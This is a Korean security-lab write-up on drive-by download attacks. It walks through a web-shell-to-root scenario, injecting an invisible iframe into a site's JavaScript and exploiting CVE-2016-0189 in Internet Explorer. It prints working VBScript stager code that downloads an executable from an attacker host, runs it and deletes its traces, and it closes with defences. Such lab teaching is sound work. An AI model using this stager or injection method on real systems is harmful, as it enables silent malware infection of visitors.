# 드라이브 바이 다운로드 (Drive-By Download, DBD)

아래는 통제된 격리 실습망(공격자 Kali · 피해 Win7/Ubuntu)에서 수행한 **방어 교육용** 기록이다. 실제 운영 중인 시스템이나 타인의 자산에 대한 적용은 불법이다.

---

## 개념

**드라이브 바이 다운로드**란, 사용자가 **웹 페이지에 접속하는 것만으로** — 별도의 클릭·설치·동의 없이 — 악성 스크립트가 **자동으로 다운로드·실행**되는 공격 기법이다.

### 왜 "접속만으로" 감염되나?
- 브라우저나 그 플러그인(과거의 Flash, Java, ActiveX, IE 스크립트 엔진 등)의 **취약점**을 악용하기 때문.
- 피해자가 "무언가를 실행했다"는 자각이 전혀 없다는 게 핵심 — 그래서 가장 은밀한 초기 침투 경로 중 하나다.

### 대표 유포 방식
| 방식 | 설명 |
|---|---|
| **익스플로잇 킷 (Exploit Kit)** | 접속자의 브라우저·플러그인 버전을 자동 판별해 **맞는 취약점을 골라 공격**하는 자동화 도구 (예: Neutrino, RIG, Angler) |
| **워터링 홀 (Watering Hole)** | 타깃이 **자주 가는 정상 사이트**를 미리 해킹해 덫을 설치 |
| **멀버타이징 (Malvertising)** | **광고 네트워크**에 악성 광고를 끼워 정상 사이트에까지 전파 |

---

## 실습 환경

| 역할 | OS | IP |
|---|---|---|
| 피해 웹서버 | Ubuntu | 192.168.0.140 |
| 피해 PC (클라이언트) | Windows 7 | 192.168.0.6 |
| 공격자 | Kali Linux | 192.168.0.xxx |

---

## 시나리오

1. 공격자가 피해 서버에 **웹쉘(Web Shell) 업로드 성공** → 웹쉘로 웹서버 계정을 탈취
2. 웹서버 계정에서 **측면 이동(Lateral Movement)**을 위해 **권한 상승(Privilege Escalation)**
3. 획득한 **root 권한**으로 웹 서버에 **악성 스크립트를 주입**

> 📎 **웹쉘(Web Shell)이란?** 서버에 업로드된 악성 스크립트 파일(`.php`, `.jsp` 등)로, 공격자가 웹 요청만으로 서버 명령을 실행하게 해주는 **원격 조종 통로**다. 파일 업로드 취약점을 타고 들어오는 경우가 많다.

---

## 실습 진행

![](../Images/Pasted%20image%2020261120103046.png)

아래 스크립트가 실행되도록 만든다. 이 코드는 **`CVE-2016-0189` 취약점**을 기반으로 동작한다.

```vbscript
105 Set Object = CreateObject("Shell.Application")
106 Object.ShellExecute "cmd", "/c CD %TEMP%&@echo Set objXMLHTTP=CreateObject(""MSXML2.XMLHTTP"")>down_exec.vbs&@echo objXMLHTTP.open ""GET"",""http://192.168.0.138/messbox.exe"",false>>down_exec.vbs&@echo objXMLHTTP.send()>>down_exec.vbs&@echo If objXMLHTTP.Status=200 Then>>down_exec.vbs&@echo Set objADOStream=CreateObject(""ADODB.Stream"")>>down_exec.vbs&@echo objADOStream.Open>>down_exec.vbs&@echo objADOStream.Type=1 >>down_exec.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>down_exec.vbs&@echo objADOStream.Position=0 >>down_exec.vbs&@echo objADOStream.SaveToFile ""%TEMP%\messbox.exe"">>down_exec.vbs&@echo objADOStream.Close>>down_exec.vbs&@echo Set objADOStream=Nothing>>down_exec.vbs&@echo End if>>down_exec.vbs&@echo Set objXMLHTTP=Nothing>>down_exec.vbs&@echo Set objShell=CreateObject(""WScript.Shell"")>>down_exec.vbs&@echo objShell.Exec(""%TEMP%\messbox.exe"")>>down_exec.vbs&del %TEMP%\messbox.exe&cscript.exe %TEMP%\down_exec.vbs&del %TEMP%\down_exec.vbs", "", "open", 0
107 End Function
108
109 Function triggerBug
110 ' Resize array we are currently indexing
```

### 📖 CVE-2016-0189 이론 (이게 왜 "접속만으로" 터지나)

- **무엇:** Internet Explorer 9~11의 **VBScript/JScript 스크립트 엔진 메모리 손상(Memory Corruption)** 취약점. "Scripting Engine Memory Corruption Vulnerability"로 분류되며 원격 코드 실행(RCE)이 가능하다. CVSS 7.5(High), 패치는 **MS16-051**.
- **"God Mode"라 불리는 이유:** 이 취약점을 쓰면 **VBScript 코드가 브라우저 샌드박스를 탈출**해 마치 로컬 셸에서 실행되는 것처럼 동작한다. 게다가 **DEP 우회·힙 스프레이·ROP 같은 복잡한 기법이 필요 없어서** 탐지가 어렵고 안정적이다 — 그래서 "신의 모드".
- **악용 현황:** 2016년 **익스플로잇 킷들이 가장 선호한 취약점** 중 하나였고, CISA의 "알려진 악용 취약점 목록(KEV)"에도 등재돼 있다. 실습에 쓰인 PoC는 Theori가 공개한 `cve-2016-0189`가 기반.
- **공격 체인(위 코드가 하는 일):** 샌드박스 탈출 → `cmd`로 **`down_exec.vbs`를 즉석에서 생성** → `MSXML2.XMLHTTP`로 원격 `messbox.exe`를 **GET 다운로드** → `ADODB.Stream`으로 디스크에 저장 → `WScript.Shell`로 **실행** → 흔적(vbs·exe) 삭제. 전형적인 **다운로더/스테이저(stager)** 구조다.

---

피해 웹 서버가 불러오는 js 파일 안에 `godmode.html`을 호출하는 코드를 심는다.
실제 웹 페이지 로딩 시 자동 호출되는 **여러 .js 중 하나**에 삽입한다 (눈에 안 띄게).

![](../Images/Pasted%20image%2020261120112134.png)

위 파일 맨 아래에 아래 스크립트 삽입 — **보이지 않는 html 호출(invisible iframe)을 유도**한다.

![](../Images/Pasted%20image%2020261120111833.png)

공격자 측 포트에서 **80 open** (payload 호스팅 / 수신 대기).

![](../Images/Pasted%20image%2020261120111739.png)

피해자가 해당 피해 서버(`dev.fngs.kr`)에 접속하면 **자동으로 `putty.exe`가 실행**되는 것을 확인할 수 있다. (여기서 putty.exe는 실행 성공을 보여주는 무해한 시연용 payload)

<video src="https://github.com/moonimax/IOT-Security-Dev/raw/main/Images/%EB%85%B9%EC%9D%8C%202026-11-20%20112324.mp4" controls width="640"></video>

▶️ 재생이 안 되면: [영상 보기 (녹음 2026-11-20 112324.mp4)](../Images/녹음%202026-11-20%20112324.mp4)

---

## 🛡️ 방어 대책 (Defense)

| 계층 | 대책 |
|---|---|
| **패치 관리** | 브라우저·플러그인·OS 최신 패치 (CVE-2016-0189는 MS16-051로 해결). **구형 IE/Win7 퇴출**이 근본책 |
| **브라우저 하드닝** | 레거시 IE **VBScript 엔진 비활성화**, ActiveX 제한, 최신 브라우저로 전환 |
| **서버 측** | 파일 업로드 검증(웹쉘 차단), 최소 권한 원칙, 웹서버 계정 권한 분리, 무결성 모니터링(.js 변조 탐지) |
| **네트워크** | 아웃바운드 통제(의심 다운로드 차단), IDS/IPS로 익스플로잇 킷 트래픽 탐지, CSP 헤더 적용 |
| **엔드포인트** | EDR로 `cmd`→`cscript`→알 수 없는 exe 실행 체인 탐지, %TEMP% 실행 감시 |
